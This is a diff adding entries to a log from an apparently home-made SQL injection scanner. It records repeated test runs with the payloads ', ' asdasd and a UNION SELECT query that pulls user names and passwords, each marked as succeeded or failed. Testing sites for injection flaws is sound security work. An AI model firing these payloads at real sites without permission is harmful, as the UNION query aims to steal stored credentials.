@@ -1592,3 +1592,79 @@ Result (has succeed): True
 Description: Your website is vulnerable to Error based SQL Injection attack!
 This is the payload that was injected <'>
 __________________________________________________
+## Date: 03-02-2024 ~ Time: 23:30:57 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:31:08 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:31:38 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:31:53 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:32:36 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:33:01 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:33:07 ##
+__________________________________________________
+Result (has succeed): False
+Description: We haven't found your website vulnerable to Error based SQL Injection attack...
+This is the payload that we tried to inject <1 UNION SELECT user, password FROM users -->
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <' asdasd>
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <'>
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:33:20 ##
+__________________________________________________
+Result (has succeed): False
+Description: We haven't found your website vulnerable to Error based SQL Injection attack...
+This is the payload that we tried to inject <1 UNION SELECT user, password FROM users -->
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <' asdasd>
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <'>
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:40:12 ##
+__________________________________________________
+Result (has succeed): False
+Description: We haven't found your website vulnerable to Error based SQL Injection attack...
+This is the payload that we tried to inject <1 UNION SELECT user, password FROM users -->
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <' asdasd>
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <'>
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:47:49 ##
+__________________________________________________
+Result (has succeed): False
+Description: We haven't found your website vulnerable to Error based SQL Injection attack...
+This is the payload that we tried to inject <1 UNION SELECT user, password FROM users -->
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <' asdasd>
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <'>
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:48:56 ##
+__________________________________________________
+## Date: 03-02-2024 ~ Time: 23:49:21 ##
+__________________________________________________
+Result (has succeed): True
+Description: Your website is vulnerable to Error based SQL Injection attack!
+This is the payload that was injected <'>
+__________________________________________________
